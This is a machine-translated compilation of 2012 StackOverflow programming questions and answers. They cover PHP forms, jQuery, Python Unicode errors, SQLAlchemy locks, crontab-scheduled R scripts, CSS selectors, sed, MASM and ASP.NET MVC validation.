    $email_message .= "Telephone: ".clean_string($telephone)."\n";
    $email_message .= "Reason for Inquiry: ".clean_string($reason)."\n";

// create email headers
$headers = 'From: '.$email_from."\r\n".
'Reply-To: '.$email_from."\r\n" .
'X-Mailer: PHP/' . phpversion();
@mail($email_to, $email_subject, $email_message, $headers);  
?>

<!-- include your own success html here --> 
```

谢谢大家，StackOverflow 的超级粉丝！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T00:35:59.053

它与 jQuery 验证无关，您只是`}`在末尾忘记了 a`if(isset($_POST['email'])) {`

`?>`添加前`}`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T00:45:54.443

在你的最后一个之前？> 再放一个 } ;)

# jquery - 使用 jQuery 来回传递 MVC 模型

> ID：12014785
> 
> 赞同：0
> 
> 时间：2012-08-18T00:31:55.540
> 
> 标签：jquery, asp.net-mvc-4

编辑：在 EDIT1 下更好地澄清了问题。

我正在尝试构建的视图的简要描述。在页面加载时，会从 Model 填充一个列表框。它们是列表中的单选按钮。

单击单选按钮时，我进行 jQuery AJAX 调用以获取另一个列表以从中选择值。然后用户将选择项目并将它们添加到页面上的第三个列表框中。

目前，在单选按钮上单击我会得到用户可以从中选择的值列表。

我还想做的是使用从 Controller 操作中获得的值更新当前模型。并随着用户不断从第二个列表中选择值，继续向模型属性添加值。在最终提交期间，所有这些值都应该可供控制器使用。

到目前为止，我只有以下代码工作：

```
$('.radioSelected').click(function () {
        var radioValue = (this).value;

        $.ajax({
            type: "POST",
            url: '/Wizard/GetListItems/',
            data: JSON.stringify({ "id": radioValue}),
            contentType: "application/json; charset=utf-8",
            dataType: "json",
            success: function (data) {
                if (data.length > 0) {
                    var newHtml = "<ul>";
                    $('#AvailableValues ul').remove(); //Remove previous values
                    $.each(data, function (index, item) {
                        newHtml += "<input type=\"checkbox\" id=" + item.ClientID + " value=" + item.ClientName + " />";
                        newHtml += "<span>" + item.ClientName + "</span> <br/>";

                    });
                    **//WANT TO UPDATE THE MODEL HERE.**
                    //Append here.
                    $('#AvailableValues').append(newHtml );
                }
                else {

                }

            },
            error: ajaxErrorHandler
        });

    }); 
```

我对此有点陌生。因此，如果能获得关于在哪里寻找以及如何解决这个问题的建议，那就太好了。就像，我如何继续添加更新用户每次选择的模型？

{我看过很多关于 SO 的问题}。谢谢。

EDIT1：为了更清楚地说明我想要实现的目标，比如在页面加载时，我会列出一个类别和子类别（它们在同一个列表中缩进显示）。在子类别选择中，我进行 jQuery ajax 调用并获取可用产品并将它们显示在列表中。用户选择他们想要的产品并单击“添加产品”按钮。这将填充第三个列表。并重复。

现在，在最终提交时，我希望能够遍历用户选择的所有产品及其相关的类别和子类别。

我在 C# 代码中定义了我的模型。当用户不断选择类别/子类别和可用产品时，我应该如何更新模型？

# javascript - 传递属性，而不是值作为参数

> ID：12014803
> 
> 赞同：3
> 
> 时间：2012-08-18T00:35:23.490
> 
> 标签：javascript

我想在 JavaScript 中实现这一点：

```
function changeAttributeValue(theAttribute, numberOfPixels)
{
    theAttribute = numberOfPixels + "px";
}

changeAttributeValue(myImage.style.left, 50);
changeAttributeValue(myImage.style.top, 80);
changeAttributeValue(myCanvas.width, 600); 
```

前两个调用应该移动图像，第三个调用应该调整画布的宽度。

然而，像这样，只是传递了传递变量的**值，所以什么也没有发生。**

有谁知道如何解决这个问题？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-18T00:39:10.350

你可以做这样的事情。

```
function changeAttributeValue(obj, propName, numberOfPixels) {
    obj[propName] = numberOfPixels + "px";
}

changeAttributeValue(myImage.style, "left", 50);
changeAttributeValue(myImage.style, "top", 80);
changeAttributeValue(myCanvas, "width", 600); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-18T00:44:32.253

好吧，这是我的“解决方案”。

它的灵感来自 Jared Farrish 的评论。也就是说，这为可以使用的属性访问创建了一个“包装器”getter/setter 函数。我不在这里推荐它（因为它比需要的更复杂），但它可以用于其他地方很棒的东西。

```
function mkAccessor(obj, attribute) {
    return function (value) {
        if (arguments.length > 0) {
            obj[attribute] = value
        }
        return obj[attribute]
    }
}

function changeAttribute (accessor, value) {
    accessor(value)
}

changeAttribute(mkAccessor(myImage.style, "top"), 50)
changeAttribute(mkAccessor(myImage.style, "left"), 80)
var canvasWidthAccessor = mkAccessor(myCanvas, "width")
// somewhere later on
changeAttribute(canvasWidthAccessor, 600)
// or just
canvasWidthAccessor(600) 
```

理论是合理的，但代码是未经测试的。YMMV。:-)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-18T01:21:52.267

如果我真的发布并评论我在评论中提供的内容，这可能会很有用。

以机智：

```
function setDim(attr, modifier, pix) {
    if (!modifier) {
        this[attr] = pix + 'px';
    } else {
        this[attr][modifier] = pix + 'px';
    }
} 
```

现在，这是如何工作的？`this`引用范围。如果您只是直接调用它：

```
setDim('style', 'width', 50); 
```

这将简单地调用`window`or`global`范围。实际上，这是为使用[`el.call()`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Function/call)or传递范围而构建的[`el.apply()`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Function/apply)，或多或少相同，这取决于您希望如何将参数传递给函数。

你真的想怎么称呼它：

```
// Gives you the scope of the element #test1
var test = document.getElementById('test1'); 
```

然后可以像这样“调用”：

```
setDim.call(test, 'style', 'width', 50); 
```

请注意，如果它只是一个属性（简单明了），请通过`null`：

```
setDim.call(test, 'width', null, 50); 
```

我`setTimeout()`在这个小提琴中使用效果，但它不是必需的：

[http://jsfiddle.net/userdude/tCz6j/2/](http://jsfiddle.net/userdude/tCz6j/2/)

浏览一下 jQuery 核心源代码，看看[`.apply()`使用](https://github.com/jquery/jquery/blob/master/src/core.js)了多少。如果你“得到”它们，这两种方法*真的很有用。*

# python - 如何修复当我尝试删除 Python 字符串中的重音符号时出现的 UnicodeDecodeError？

> ID：12014810
> 
> 赞同：1
> 
> 时间：2012-08-18T00:35:58.930
> 
> 标签：python, unicode, non-ascii-characters

我正在尝试使用此功能：

```
import unicodedata

def remove_accents(input_str):
    nkfd_form = unicodedata.normalize('NFKD', unicode(input_str))
    return u"".join([c for c in nkfd_form if not unicodedata.combining(c)]) 
```

在下面的代码中（它解压缩并读取具有非 ASCII 字符串的文件）。但是我收到了这个错误，（来自这个库文件`C:\Python27\Lib\encodings\utf_8.py`）：

```
Message File Name   Line    Position    
Traceback               
    <module>    C:\Users\CG\Desktop\Google Drive\Sci&Tech\projects\naivebayes\USSSALoader.py    64      
    getNameList C:\Users\CG\Desktop\Google Drive\Sci&Tech\projects\naivebayes\USSSALoader.py    26      
    remove_accents  C:\Users\CG\Desktop\Google Drive\Sci&Tech\projects\naivebayes\USSSALoader.py    17      
UnicodeDecodeError: 'ascii' codec can't decode byte 0xe1 in position 3: ordinal not in range(128) 
```

为什么我会收到此错误？如何避免它并发挥`remove_accents`作用？

谢谢你的帮助！

这是整个代码：

```
#!/usr/bin/env python

# -*- coding: utf-8 -*-
# -*- coding: utf-8 -*-

import os
import re
from zipfile import ZipFile
import csv

##def strip_accents(s):
##   return ''.join((c for c in unicodedata.normalize('NFD', s) if unicodedata.category(c) != 'Mn'))

import unicodedata

def remove_accents(input_str):
    nkfd_form = unicodedata.normalize('NFKD', unicode(input_str))
    return u"".join([c for c in nkfd_form if not unicodedata.combining(c)])

def getNameList():
    namesDict=extractNamesDict()
    maleNames=list()
    femaleNames=list()
    for name in namesDict:
        print name
#        name = strip_accents(name)
        name = remove_accents(name)
        counts=namesDict[name]
        tuple=(name,counts[0],counts[1])
        if counts[0]>counts[1]:
            maleNames.append(tuple)
        elif counts[1]>counts[0]:
            femaleNames.append(tuple)
    names=(maleNames,femaleNames)
 #   print maleNames
    return names

def extractNamesDict():
    zf=ZipFile('names.zip', 'r')
    filenames=zf.namelist()

    names=dict()
    genderMap={'M':0,'F':1}

    for filename in filenames:
        file=zf.open(filename,'r')
        rows=csv.reader(file, delimiter=',')

        for row in rows:
            #name=row[0].upper().decode('latin1')
            name=row[0].upper()
            gender=genderMap[row[1]]
            count=int(row[2])

            if not names.has_key(name):
                names[name]=[0,0]
            names[name][gender]=names[name][gender]+count

        file.close()
  #      print '\tImported %s'%filename
   # print names
    return names

if __name__ == "__main__":
    getNameList() 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-18T02:39:04.877

最佳做法是在数据进入程序时解码为 Unicode：

```
for row in rows:
    name=row[0].upper().decode('utf8') # or whatever...you DO need to know the encoding. 
```

然后`remove_accents`可以是：

```
def remove_accents(input_str):
    nkfd_form = unicodedata.normalize('NFKD', input_str)
    return u''.join(c for c in nkfd_form if not unicodedata.combining(c)) 
```

离开程序时对数据进行编码，例如写入文件、数据库、终端等。

为什么首先要删除重音？

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-18T16:55:20.213

如果你想将 unicode 字符稳健地转换为字符串中的 ascii，你应该使用很棒的[unidecode](http://pypi.python.org/pypi/Unidecode/)模块：

```
>>> import unidecode
>>> unidecode.unidecode(u'Björk')
'Bjork'
>>> unidecode.unidecode(u'András Sütő')
'Andras Suto'
>>> unidecode.unidecode(u'Ελλάς')
'Ellas' 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-18T00:39:29.190

你得到它是因为你在没有指定编解码器的情况下从字节串解码：

```
unicode(input_str) 
```

在那里添加一个编解码器（这里我假设您的数据以 utf-8 编码，`0xe1`将是 3 字节字符的第一个）：

```
unicode(input_str, 'utf8') 
```

# asp.net-mvc - 如何在 ASP.NET MVC 视图中嵌入我的 Wordpress.org 博客？

> ID：12014813
> 
> 赞同：2
> 
> 时间：2012-08-18T00:36:38.983
> 
> 标签：asp.net-mvc, asp.net-mvc-3, wordpress

我在 Wordpress.org 上有一个博客（短期内不打算自己托管）。

请告诉我是否有可能以及如何在 ASP.NET MVC 3 视图中动态嵌入（用于显示/交互，而不是存储内容）该博客。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T07:18:46.143

最简单的解决方案是使用`<iframe>`指向您的 WordPress 博客。

# css - 包含外部样式表而不是@import 的替代方法？

> ID：12014822
> 
> 赞同：1
> 
> 时间：2012-08-18T00:38:08.393
> 
> 标签：css, import, stylesheet

因此，文档显示在样式表上使用 @import 会慢一些，而且还会进行额外的服务器调用。

例子：

```
@import url('narf.css'); 
```

好吧，我讨厌使用一个巨大的样式表，它很乱。当涉及到我的代码时，我是一个整洁的怪胎。哈哈哈。

无论如何，我在我的设计中使用了 dreamweaver，但它不会“响应”使用常规包含来包含另一个样式表（即使是样板文件）。基本上，您在设计时无法访问“包含”样式。

这些在使用 Dreamweaver 时不起作用（尽管它们可能在服务器上起作用）。

```
<!--#include file="narf.css" -->
<?php include('narf.css'); ?> 
```

那么，我问，在设计过程中是否有任何其他替代方案可以实际使用样式并且仍然保持服务器请求下降？我很感激你能分享的任何见解。

再次感谢溢出社区！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T00:54:46.327

您可以只拥有多个样式表，并将您的样式表连接起来用于生产，这样您就可以分离您的样式表，并将服务器请求保持在最低限度。

# regex - CJK 字符集的正则表达式的模拟是什么？

> ID：12014823
> 
> 赞同：-1
> 
> 时间：2012-08-18T00:38:26.023
> 
> 标签：regex, unicode, character-encoding, pattern-matching, cjk

CJK 字符集的正则表达式的模拟是什么？ASCII 或类似拉丁字母的字符与 CJK 字符有质的区别？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-19T08:38:50.333

> CJK 字符集的正则表达式的模拟是什么？

正则表达式。它一直能够处理不同的字符集，但是使用 Unicode 变得更加简单和可靠。

您使用什么语言/环境？一般来说，现代实现都支持 Unicode 字符，尽管有些可能缺少扩展功能，例如`\p{...}`字符类。

> ASCII 或类似拉丁字母的字符与 CJK 字符有质的区别？

CJK 表意文字和音节没有大小写，因此它们是“字母，其他”类别的成员，而不是大多数拉丁字母的“字母，大写字母”或“字母，小写字母”。它们还具有不同的换行属性。

# python - SQL Alchemy 关系加载器在表上留下锁？

> ID：12014824
> 
> 赞同：6
> 
> 时间：2012-08-18T00:39:08.663
> 
> 标签：python, mysql, sqlalchemy

我有非常简单的代码导致我的 MySQL 数据库挂起：

```
import sqlalchemy as sa
from sqlalchemy import orm

# creating the engine, the base, etc
import utils
import config

utils.base_init(config)
Base = config.Base

class Parent(Base):
    __tablename__ = 'Parents'
    id = sa.Column(sa.Integer, primary_key=True)
    children = orm.relationship('Child', backref='parent')

class Child(Base):
    id = sa.Column(sa.Integer, primary_key=True)
    parent_id = sa.Column(sa.Integer)

    __tablename__ = 'Children'

    __table_args__ = (sa.ForeignKeyConstraint(
        ['parent_id'],
        ['Parents.id'],
        onupdate='CASCADE', ondelete='CASCADE'),{})

Base.metadata.create_all()

session = orm.sessionmaker(bind=config.Base.metadata.bind)()
p = Parent(id=1)
c1 = Child(id=1)
c2 = Child(id=2)
session.add(p)
session.add(c1)
session.add(c2)
session.commit()

# Works
# Base.metadata.drop_all()

c1.parent
# 2012-08-17 20:16:21,459 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
# 2012-08-17 20:16:21,460 INFO sqlalchemy.engine.base.Engine SELECT `Children`.id AS `Children_id`, `Children`.parent_id AS `Children_parent_id` 
# FROM `Children` 
# WHERE `Children`.id = %s
# 2012-08-17 20:16:21,460 INFO sqlalchemy.engine.base.Engine (1,)

Base.metadata.drop_all()
# hangs until i kill the connection above.
# server status: 'Waiting for table metadata lock' 
```

看起来 SQL Alchemy 在发出加载关系属性所需的选择查询后没有释放元数据锁？我怎样才能让它释放它？我什至不明白为什么选择语句首先需要锁定表！

当然，我可以通过关闭会话来让这段特定的代码工作，但这在我的实际程序中并不实用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T15:06:42.997

您需要在调用之前开始一个新的事务`.drop_all()`；MySQL 在这个事务中看到你从表中读取，并锁定表以防止被删除：

```
session.commit()
Base.metadata.drop_all() 
```

提交一个事务隐式地开始一个新事务。

MySQL 保证事务隔离；您的事务将读取一致的数据，并且在您开始新事务之前不会看到其他事务提交的更改。然而，一条`DROP TABLE`语句使 MySQL 无法保持这些保证，因此表被锁定。

或者，您可以更改事务隔离级别，告诉 MySQL 您不关心隔离保证。由于会话连接是池化的，因此只能对所有连接执行此操作，或者根本不执行此操作；使用`isolation_level`参数[`create_engine()`](http://docs.sqlalchemy.org/en/rel_0_7/dialects/mysql.html#transaction-isolation-level)：

```
engine = create_engine(
    'mysql://username:passwd@localhost/databasename',
    isolation_level='READ UNCOMMITTED') 
```

有关每个隔离级别的详细信息，请参阅[`SET TRANSACTION`文档](https://dev.mysql.com/doc/refman/5.0/en/set-transaction.html)。

# javascript - JavaScript IF..ELSE 条件不输出预期值

> ID：12014826
> 
> 赞同：0
> 
> 时间：2012-08-18T00:39:22.563
> 
> 标签：javascript, if-statement

我正在[阅读 Javascript 的教程](http://www.w3schools.com/jsref/)。我正在测试`Boolean()`函数和 If...Else 条件。

我在网站上有一个按钮。当我单击按钮时，它会显示布尔变量 ( `myvar`) 的当前状态以及相应的状态 ( `myvartxt`)（即`false`表示“关闭”，`true`表示“打开”）。这样做的原因是因为我想稍后打开/关闭 LED，并且不希望它说假/真，而是说开/关。

现在的问题是，当我单击按钮时，布尔值 (myvar) 的状态为 false，这是正确的，但 myvartxt 变量在应该显示为 OFF 时为 ON。我只是不明白。有任何想法吗？提前感谢您的帮助！

[在这里](http://www.w3schools.com/jsref/tryit.asp?filename=tryjsref_tostring_boolean)快速测试代码：

```
<!DOCTYPE html>
<html>
<body>
<p id="demo"></p>
<p id="demo1"></p>

<button onclick="myFunction()">Try it</button>

<script type="text/javascript">
function myFunction()
{
    //Initial state
    var myvar=new Boolean(0);
    var myvartxt = "OFF";

    //display current state of Boolean
    var x=document.getElementById("demo");
    x.innerHTML=myvar.toString();

    //display corresponding ON -> true, OFF -> false
    if (myvar) //INITIALLY THIS IS false (not a string) so why does it think this is true?
    {
        myvartxt = "ON"; 
    }
    else
    {
        myvartxt = "OFF";
    }

    var y=document.getElementById("demo1");
    y.innerHTML=myvartxt;
}

</script>

</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T00:47:08.917

代码`if (myvar)`是错误的，它只是检查是否`myvar`设置。你必须改变陈述

```
if (myvar.toString() == true) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T00:47:50.423

您正在使用`new Boolean()`;创建一个新对象 JavaScript 中的对象评估为`true`.

我认为，如果您放弃`new`关键字并`Boolean()`仅将其用作函数，您会看到行为更符合您的预期。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-18T00:51:49.660

首先，[`jQuery`](http://jquery.com/)

这可以这样重写：

```
// Perform logic when document is set and ready.
$(document).ready(function() { 
  var myvar = false; // No need for Boolean objects.
  $("demo").html(myvar.toString()); // Set the value of demo.
  myvar ? $("demo1").html("ON") : $("demo1").html("OFF"); // True/false ON/OFF in demo1
} 
```

此外，JavaScript 不适合相等性测试，请看[这里](http://geekswithblogs.net/brians/archive/2010/07/03/quality-equality-with-javascript-quotquot-gt-quotquot.aspx)，如果有机会，请阅读[这里](http://shop.oreilly.com/product/9780596517748.do)。

# c - Apache 2.4 MPM 工作者：线程初始化？

> ID：12014831
> 
> 赞同：2
> 
> 时间：2012-08-18T00:39:46.187
> 
> 标签：c, linux, apache, pthreads

我正在编写一个 Apache 2.4 模块，并且正在使用 MPM 工作程序。

是否有一个我可以使用的钩子在创建新线程时从该线程的上下文中调用？我需要做一些每个线程的初始化。

（更一般地说，是否在某处记录了完整的钩子列表？）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T13:36:53.173

“不”的简短回答，没有这样的钩子用于使用工作 MPM 进行线程初始化。Apache 设计人员建议模块“尽可能与 MPM 无关”。关键概念是模块必须适合输入过滤器 - 内容生成 - 输出过滤器架构，独立于实际管理工作负载的 MPM。

当然，在某些情况下，您需要知道自己在哪个环境中工作艰难

我们正在研究类似的问题。当请求进入时，线程会被触发，它们运行 ap_hook_handler 中定义的钩子，据我所知，那是你的线程必须获得访问权限或分配它需要的资源以服务请求的时候。

有人告诉我 mod_rivet 有一个有趣的解决方案，它创建自己的线程池并让它们与运行请求处理程序的 Apache 线程交换数据。

# api - Foursquare“图像”URL 返回内部服务器错误

> ID：12014835
> 
> 赞同：1
> 
> 时间：2012-08-18T00:40:09.027
> 
> 标签：api, foursquare, avatar

一切似乎都在我的应用程序中工作，但“空白”头像，4sq 返回[https://irs0.4sqi.net/img/user/blank_boy.png](https://irs0.4sqi.net/img/user/blank_boy.png)但该链接已损坏......我正在使用最新版本的API。有没有人找到解决这个问题的方法？

```
photo =     {
    prefix = "https://irs0.4sqi.net/img/user/";
    suffix = "/blank_boy.png";
}; 
```

（这是服务器的响应）

谢谢

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-19T00:36:52.253

正如@Jonathan Levison 的评论所指出的，您需要指定前缀和后缀值之间的“维度”。例如

```
https://irs0.4sqi.net/img/user/100x100/blank_boy.png 
```

# r - 如何在 crontab 中运行 R 脚本

> ID：12014837
> 
> 赞同：2
> 
> 时间：2012-08-18T00:40:46.350
> 
> 标签：r, crontab

使用 crontab -e 我试过了：

```
* * * * *  Rscript /home/.../file.r
* * * * * /usr/lib/R/bin/Rscript /home/.../file.r
* * * * * /usr/bin/Rscript /home/.../file.r
* * * * * /home/.../foo.sh 
```

其中 foo.sh 包含：

```
sudo R CMD BATCH file.r 
```

只需运行 $ ./foo.sh 即可。$ R CMD BATCH file.r 有效。

我在 crontab 中没有尝试过任何工作。有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-18T00:43:50.197

您需要在 foo.sh 中包含完整路径：

```
sudo R CMD BATCH /home/.../file.r 
```

我还应该补充一点，第一个版本对我有用，尽管我将它设置为特定时间而不是`* * * * *`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-18T01:22:26.333

这里值得一提的是 CRANberries 条目，它每天（多次）工作了 5 年以上：

```
# every few hours, run cranberries
11 */2 * * *    edd     ~/cranberries/cranberries.r 
```

这里值得注意的是

1.  时间规范，这里每两个小时过去 11 分钟
2.  用户
3.  完整路径，使用 'globbing'扩展`~`为`$HOME``edd`

之后，您只需要确保脚本实际上是可执行的。无论您使用 Rscript、litter 还是 R BATCH CMD 都无关紧要。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-05-07T16:53:29.213

在我的用户级 crontab 中，我运行一个 R 脚本来收集来自各种来源的推文。

我使用： **`crontab -u myusername -e`** 将此添加到我的 crontab 文件的末尾

**`0 0 * * * /home/bob/Documents/SWtweets/tweetbash.sh`**

我以用户与 root 的身份运行它，没有什么区别，但它仅在我在用户级别运行时才对我有用。

下面是我在我的 tweetbash.sh shell 脚本中输入的内容，它告诉 bash 程序运行位于指定路径的 R 脚本。

**`#! /bin/bash R CMD BATCH /home/bob/Documents/SWtweets/tweets.R`**

做过**`chmod +x tweetbash.sh`**

它适用于我的目的。

鲍勃

# html - 第一个子伪类不适用于标签

> ID：12014845
> 
> 赞同：2
> 
> 时间：2012-08-18T00:43:19.760
> 
> 标签：html, css, css-selectors, pseudo-class

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-18T00:48:22.757

:first-child 的工作方式与预期的一样，但是您示例中的每个 A 都是第一个孩子。它是其父 LI 的第一个孩子。

你要找的是这个：

```
ol.bjqs-markers li:first-child a {} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-18T00:47:50.043

这是因为您将此伪类应用于 li 元素中的第一个链接。采用

```
ol.bjqs-markers a:first-child {
  border-left:none;
} 
```

或者

```
ol.bjqs-markers li:first-child a {
  border-left:none;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-18T00:47:58.477

也许你想做

```
ol.bjqs-markers li:first-child a{ 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-18T00:49:15.860

这是因为您将边框应用于每个 <li> 标记中的第一个 <a> 标记。试试这个：

```
ol.bjqs-markers li:first-child a { } 
```

# unix - 用于解析/打印流的 Shell 命令

> ID：12014846
> 
> 赞同：0
> 
> 时间：2012-08-18T00:43:31.330
> 
> 标签：unix, grep, posix

## 具体问题

什么是一个 shell 命令来转换这样的字符串

```
class A(B, C): 
```

成这样的字符串集

```
B -> A; 
C -> A; 
```

其中 A、B 和 C 都是 \w+ 的形式，而在我写“B, C”的地方，我实际上是指用逗号和空格分隔的任意数量的术语。即“B，C”同样可以是“B”或“B，C，D，E”。

## 大图

我正在可视化 Python 项目的类层次结构。我正在查看所有 .py 文件的目录，查找类声明，然后将它们转换为[DOT 格式](http://en.wikipedia.org/wiki/Dot_language)。到目前为止，我已经使用 find 和 grep 来获取行列表。我已经在[一个小的 python 脚本](https://gist.github.com/3332164)中完成了上面的操作。如果可能的话，我想只使用标准的 unix 工具链。理想情况下，我想找到另一种可组合的工具来输入和输出并完成链条。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T01:22:26.293

你想要原始的？这个 sed 脚本应该可以在 V7 之后的所有 UNIX 上运行（但我还没有在任何真正古老的东西上测试过它，所以要小心）。运行它`sed -n -f scriptfile infile > outfile`

```
: loop
/^class [A-Za-z0-9_][A-Za-z0-9_]*(\([A-Za-z0-9_][A-Za-z0-9_]*, *\)*[A-Za-z0-9_][A-Za-z0-9_]*):$/{
h
s/^class \([A-Za-z0-9_][A-Za-z0-9_]*\)(\([A-Za-z0-9_][A-Za-z0-9_]*\)[,)].*/\2 -> \1;/
p
g
s/\(class [A-Za-z0-9_][A-Za-z0-9_]*(\)[A-Za-z0-9_][A-Za-z0-9_]*,* */\1/
b loop
} 
```

这些是 BRE（基本正则表达式）。它们没有`+`运算符（仅在扩展正则表达式中找到），而且绝对没有`\w`（由 perl 发明）。所以你的简单`\w+`变成`[A-Za-z0-9_][A-Za-z0-9_]*`了我不得不多次使用它，导致严重的丑陋。

以伪代码形式，它的作用是：

```
while the line matches /^class \w+(comma-separated-list-of \w+):$/ {
    save the line in the hold space
    capture the outer \w and the first \w in the parentheses
    replace the entire line with the new string "\2 -> \1;" using the captures
    print the line
    retrieve the line from the hold space
    delete the first member of the comma-separated list
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T02:09:06.307

使用 Python 的[`ast`](http://docs.python.org/library/ast.html)模块解析 Python 和 Python 一样简单。

```
import ast
class ClassDumper(ast.NodeVisitor):
  def visit_ClassDef(self, clazz):
    def expand_name(expr):
      if isinstance(expr, ast.Name):
        return expr.id
      if isinstance(expr, ast.Attribute):
        return '%s.%s' % (expand_name(expr.value), expr.attr)
      return ast.dump(expr)
    for base in clazz.bases:
      print '%s -> %s;' % (clazz.name, expand_name(base))
    ClassDumper.generic_visit(self, clazz)
ClassDumper().visit(ast.parse(open(__file__).read())) 
```

（这不是完全正确的嵌套，因为它会输出`Inner -> Base;`而不是`Outer.Inner -> Base;`，但您可以通过在手动遍历中跟踪上下文来解决这个问题。）

# winapi - ReadFile() WinApi 汇编程序

> ID：12014856
> 
> 赞同：0
> 
> 时间：2012-08-18T00:45:24.700
> 
> 标签：winapi, assembly, masm

我遇到了 ReadFile() 的一个奇怪问题。文本文件已正确打开，但它仅读取 4 个字节而不是 MemorySize 中声明的字节数。C 中的相同代码可以正确执行。有人知道怎么了？

问候

```
.DATA
FileName DB "test.txt",0
MemorySize  DWORD 10

.DATA?
hFile    HANDLE ?
pMemory  DWORD  ?
SizeR    DWORD  ?

.CODE
start:

INVOKE CreateFile, ADDR FileName,\ 
    GENERIC_READ, 0, NULL,\
    OPEN_EXISTING, 0, NULL
mov hFile, eax
INVOKE GlobalAlloc, GMEM_FIXED or GMEM_ZEROINIT, MemorySize+1
mov pMemory, eax
INVOKE ReadFile, hFile, ADDR pMemory, MemorySize, ADDR SizeR, NULL
INVOKE MessageBox, 0, ADDR pMemory, 0, 0
INVOKE LocalFree, pMemory
INVOKE CloseHandle, hFile
ret
end start 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T03:08:11.363

```
INVOKE ReadFile, hFile, ADDR pMemory, MemorySize, ADDR SizeR, NULL
INVOKE MessageBox, 0, ADDR pMemory, 0, 0 
```

在这两行中，您传递了一个指向 pMemory 指针的指针。GlobalAlloc 返回一个指向内存的指针，而 ReadFile 需要一个指针而不是指向指针的指针。删除 ADDR，它应该可以工作。

```
INVOKE GlobalAlloc, GMEM_FIXED or GMEM_ZEROINIT, MemorySize+1 
```

这也是错误的。您不能像在高级语言中那样做 MemorySize + 1。在这种情况下，您需要执行以下操作：

```
inc     MemorySize 
```

在您致电 GlobalAlloc 之前

# asp.net-mvc - ASP.NET MVC 验证将类添加到包含 div

> ID：12014857
> 
> 赞同：5
> 
> 时间：2012-08-18T00:45:27.040
> 
> 标签：asp.net-mvc, twitter-bootstrap

我正在使用引导 CSS 表单样式，当文本框收到验证错误消息时，我需要将类“错误”放在 containsg 上。我怎样才能做到这一点？

问题是，在提交表单之前，所有验证都会在 ajax 上触发，除了我的自定义验证器，它只在发布时触发。所以需要确保它在两种情况下都发生。

[http://twitter.github.com/bootstrap/base-css.html#forms](http://twitter.github.com/bootstrap/base-css.html#forms)

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-18T09:47:01.247

`onError`在 jquery.validate.unobtrusive 中的函数内部，只需添加如下`.addClass("error")`行：

```
function onError(error, inputElement) {  // 'this' is the form element
  var container = $(this).find("[data-valmsg-for='" + escapeAttributeValue(inputElement[0].name) + "']"),
      replace = $.parseJSON(container.attr("data-valmsg-replace")) !== false;

  container.removeClass("field-validation-valid").addClass("field-validation-error");
  error.data("unobtrusiveContainer", container);
  container.parents(".field-encapsulator:first").addClass("error");

  if (replace) {
    container.empty();
    error.removeClass("input-validation-error").appendTo(container);
  }
  else {
    error.hide();
  }
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-18T04:44:37.187

ASP.NET MVC 将`field-validation-error`类添加到错误消息元素，并`input-validation-error`通过 javascript 在服务器端和客户端形成控件。没有包含元素，具体取决于您的代码，表单控件及其标签可能位于也可能不在同一包含元素下。而且，即使他们这样做了，MVC 也会将提到的类设置为表单控件和错误消息元素，而不是包含元素。

此外，当您使用`Html.EditorForModel()`生成的标记自动生成表单时，如下所示：

```
<div class="editor-label"><label for="foo">Foo</label></div>
<div class="editor-field"><input name="foo"/></div> 
```

没有包含元素可以映射到`control-group`Twitter Bootstrap 上的类。您可以通过添加模板来更改此`EditorTemplates/Object.cshtml`模板。

我建议您将 Twitter Bootstrap 调整为 ASP.NET MVC，而不是相反。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2021-04-20T07:05:03.070

如[使用 jQuery Unobtrusive Validation 时如何添加“submitHandler”函数的一些答案中所述？](https://stackoverflow.com/questions/4747017/how-to-add-a-submithandler-function-when-using-jquery-unobtrusive-validation)，可以通过 访问设置`$("form").data("validator").settings`。

然后您可以设置您喜欢的任何有效/无效类：

```
var settings = $("form").data("validator").settings;
settings.errorClass += " is-invalid";
settings.validClass += " is-valid"; 
```

# php - 带有 /12 而不是 ?var=12 的 URL

> ID：12014860
> 
> 赞同：-1
> 
> 时间：2012-08-18T00:45:34.030
> 
> 标签：php, html, url-rewriting

> **可能重复：**
> [如何：用 PHP 重写 URL？](https://stackoverflow.com/questions/1039725/how-to-url-re-writing-in-php)
> [重写任意数量的路径段以查询参数](https://stackoverflow.com/questions/3655893/rewriting-an-arbitrary-number-of-path-segments-to-query-parameters)

